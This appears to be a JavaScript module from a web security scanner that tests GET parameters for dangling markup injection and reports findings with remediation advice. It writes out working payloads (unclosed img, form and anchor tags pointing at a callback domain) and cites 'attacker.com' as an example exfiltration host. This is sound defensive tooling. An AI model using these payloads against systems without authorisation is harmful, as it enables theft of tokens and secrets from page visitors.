import axios from 'axios';
import { logger } from '../utils/logger.js';

export async function testDanglingMarkup(endpoint, options = {}) {
    const findings = [];
    const timeout = options.timeout || 10000;
    
    // Test primarily GET endpoints with parameters that might reflect HTML
    if (!endpoint.parameters || endpoint.method !== 'GET') return findings;
    
    if (!options.oastClient || typeof options.oastClient.getDomain !== 'function') {
        logger.debug('[DanglingMarkup] Skipping Dangling Markup test because no valid OAST client is provided.');
        return findings;
    }

    logger.info(`[DanglingMarkup] Testing for dangling markup injection on: ${endpoint.url}`);

    const params = typeof endpoint.parameters === 'object' ? Object.keys(endpoint.parameters) : [];
    const oastDomain = options.oastClient.getDomain();

    // Standard dangling markup payloads that capture everything until the next quote
    // E.g. <img src='https://attacker.com/?dangling=
    const payloads = [
        `"><img src='http://${oastDomain}/dangling?data=`,
        `"><form action="http://${oastDomain}/dangling"><input type="hidden" name="data" value="`,
        `'><a href='http://${oastDomain}/dangling?data=`
    ];

    for (const param of params) {
        for (const payload of payloads) {
            try {
                const testUrl = new URL(endpoint.url);
                testUrl.searchParams.set(param, payload);
                
                // Fire the request
                await axios.get(testUrl.toString(), {
                    headers: endpoint.headers,
                    timeout,
                    validateStatus: () => true
                });

                // Wait for potential OAST callbacks (images load asynchronously in the victim browser)
                // However, in an automated scanning context without a real browser visiting the injected page,
                // the image won't actually be fetched unless the scanner itself parses HTML and fetches resources.
                // To simulate this in a scanner, we check if the payload reflects exactly as injected without closing quotes being added by a sanitizer.
                
                const verifyResp = await axios.get(testUrl.toString(), { timeout, validateStatus: () => true });
                const bodyStr = typeof verifyResp.data === 'string' ? verifyResp.data : JSON.stringify(verifyResp.data);

                // If the unclosed tag is reflected exactly (meaning it wasn't stripped or forcibly closed by the backend)
                if (bodyStr.includes(payload)) {
                    // We look at what follows the injection point in the response body to see if it's sensitive
                    const injectionIndex = bodyStr.indexOf(payload) + payload.length;
                    const nextHtml = bodyStr.substring(injectionIndex, injectionIndex + 200); // Look at the next 200 chars

                    // If there's a CSRF token, API key, or interesting input field following it
                    if (/csrf|token|secret|key|password|email|value=/i.test(nextHtml)) {
                        findings.push({
                            assetId: endpoint.assetId,
                            endpointId: endpoint.id,
                            title: 'Dangling Markup Injection',
                            description: `Parameter '${param}' is vulnerable to Dangling Markup Injection. By injecting an unclosed HTML tag (e.g., \`<img src='http://attacker.com/?\`), an attacker can capture the remainder of the page source until the next matching quote. In this case, sensitive data (like CSRF tokens or secrets) immediately follows the reflection point and would be sent to the attacker's server when a victim views the page.`,
                            category: 'INFORMATION_DISCLOSURE',
                            severity: 'HIGH',
                            cvss: 7.4,
                            detectedBy: 'dangling-markup-engine',
                            confidence: 90,
                            evidence: [
                                { type: 'REQUEST', title: 'Payload', content: payload },
                                { type: 'RESPONSE', title: 'Captured Data Risk', content: `The following HTML would be captured by the attacker:\n${nextHtml.substring(0, 100)}...` }
                            ],
                            remediation: 'Implement strict context-aware output encoding. Additionally, implement Content Security Policy (CSP) with `default-src \'self\'` and strict `img-src` directives to prevent data exfiltration to external domains.'
                        });
                        break; // Stop testing other payloads for this param
                    }
                }

            } catch (e) {}
        }
    }

    return findings;
}
